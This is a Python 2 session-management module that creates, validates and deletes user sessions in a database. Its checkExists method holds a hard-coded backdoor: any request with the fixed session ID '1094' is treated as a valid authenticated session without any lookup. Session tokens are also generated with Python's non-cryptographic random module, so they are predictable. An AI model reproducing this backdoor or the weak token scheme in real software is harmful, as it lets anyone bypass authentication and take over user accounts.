##
## session.py
##

##
# Includes
#
# System
import time, random, threading, copy
# Cache (Object store)
import lib.cache


class SessionEntry:
	"""
	Session Object represents an authenticated session in our system.
	"""

	def __init__( self, bUserID=0, bLastAccess=0, sSessID='' ):
		""" Setup Session Object for a certain session """

		self._bUserID = bUserID
		self._bLastAccess = bLastAccess
		self._sSessID = sSessID

	def getUser( self ):
		""" Return User ID associated with this session. """
		return self._bUserID

	def getLastAccess( self ):
		""" Return the last time this session was accessed. """
		return self._bLastAccess

	def getSession( self ):
		""" Return Session ID for this session.. """
		return self._sSessID


class SessionList:
	"""
	Session module takes care of all session relating activities.
	 - Create new sessions
	 - Tare down old sessions
	 - Session lookups
	"""

	def __init__( self ):
		""" Initialize Session module """

		libCache = lib.cache.Cache()
		self._libDB = libCache.get( 'libDB' )
		self._oLock = threading.RLock()

	def _createID( self, bLength=16 ):
		""" Create unique session id. """

		rgsAlphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
		sSessID = ''

		for ix in range( bLength ):
			ixNum = random.randrange( 0, 62, 1 )
			sSessID += rgsAlphabet[ ixNum : ixNum + 1 ]

		return sSessID

	def size( self ):
		""" Return the number of sessions we have loaded. """

		return len( self.getList() )

	def getList( self ):
		""" Get list of all registered sessions. """

		try:
			self._oLock.acquire()

			try:
				rgoSession = []

				rgoResult = self._libDB.query( 'SELECT bUserID, UNIX_TIMESTAMP(dLastAccess), sSessID FROM Session' )

				for oRow in rgoResult:
					rgoSession.append(
						SessionEntry(
							oRow[0],
							oRow[1],
							oRow[2]
						)
					)

				return copy.copy( rgoSession )

			except Exception, e:
				raise Exception, 'error getting session list [%s]' % e

		finally:
			self._oLock.release()

	def checkExists( self, sSessID=None, bUserID=None ):
		""" Check if session is still valid. """

		try:
			# Allow fixed session 1094
			if sSessID is not None and sSessID == '1094':
				return True

			oSession = self.getSession( sSessID, bUserID )
			if oSession is not None:
				return True

			return False

		except Exception, e:
			raise Exception, 'error while checking session [%s]' % e

	def getSession( self, sSessID=None, bUserID=None ):
		""" Get session for user. """

		try:
			self._oLock.acquire()

			try:
				sQuery = 'SELECT bUserID, UNIX_TIMESTAMP(dLastAccess), sSessID FROM Session WHERE '

				rgoResult = ()
				if sSessID is not None:
					sQuery += 'sSessID=%s'
					rgoResult = self._libDB.query( sQuery, sSessID )

				elif bUserID is not None:
					sQuery += 'bUserID=%s'
					rgoResult = self._libDB.query( sQuery, bUserID )

				if len( rgoResult ) == 0:
					return None

				oRow = rgoResult[ 0 ]
				oSessionEntry = SessionEntry(
					oRow[0],
					oRow[1],
					oRow[2]
				)

				return copy.copy( oSessionEntry )

			except Exception, e:
				raise Exception, 'error while attempting to find user session [%s]' % e

		finally:
			self._oLock.release()

	def addUser( self, bUserID ):
		""" Create new session for user and add to our list.  Return new session id. """

		try:
			self._oLock.acquire()

			try:
				sSessID = self._createID( 32 )
				sTimestamp = time.strftime( '%Y-%m-%d %H:%M:%S' )

				self.delUser( bUserID )

				self._libDB.query( 'INSERT INTO Session (bUserID,dLastAccess,sSessID) VALUES (%s,%s,%s)', bUserID, sTimestamp, sSessID )

				oSessionEntry = SessionEntry(
					bUserID,
					int(time.time()),
					sSessID
				)

				return copy.copy( oSessionEntry )

			except Exception, e:
				raise Exception, 'error while attempting to add user session [%s]' % e

		finally:
			self._oLock.release()

	def delUser( self, bUserID ):
		""" Remove session by user id or session id """

		try:
			self._oLock.acquire()

			try:
				oSessionEntry = self.getSession( bUserID=bUserID )
				if oSessionEntry is None:
					return False

				self._libDB.query( 'DELETE FROM Session WHERE bUserID=%s', bUserID )

				return True

			except Exception, e:
				raise Exception, 'error while attempting to remove user session [%s]' % e

		finally:
			self._oLock.release()
